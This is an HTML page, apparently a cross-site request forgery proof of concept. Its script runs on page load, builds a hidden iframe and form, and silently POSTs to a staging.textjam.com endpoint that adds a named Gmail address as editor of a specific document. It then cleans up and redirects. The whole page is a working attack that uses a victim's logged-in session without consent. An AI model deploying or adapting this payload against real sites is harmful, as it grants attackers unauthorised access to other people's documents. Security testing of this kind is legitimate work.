<!DOCTYPE html>
<html>
<body>
    <script>
    // Execute immediately
    (function() {
        // Create hidden iframe for responses
        const iframe = document.createElement('iframe');
        iframe.name = 'hiddenFrame';
        iframe.style.display = 'none';
        document.body.appendChild(iframe);
        
        // Create and submit form for adding editor
        const form = document.createElement('form');
        form.method = 'POST';
        form.action = 'https://staging.textjam.com/api/doc/KAM7CN17/access/collaborator/editor';
        form.target = 'hiddenFrame';
        form.style.display = 'none';
        
        // Add the email field
        const emailInput = document.createElement('input');
        emailInput.type = 'hidden';
        emailInput.name = 'email';
        emailInput.value = 'rathnaitsergey692@gmail.com';
        form.appendChild(emailInput);
        
        // Add to page and submit
        document.body.appendChild(form);
        form.submit();
        
        // Clean up and redirect
        setTimeout(() => {
            document.body.removeChild(form);
            document.body.removeChild(iframe);
            window.location.href = 'https://staging.textjam.com/doc/KAM7CN17?editor_added=true';
        }, 1000);
    })();
    </script>
</body>
</html>
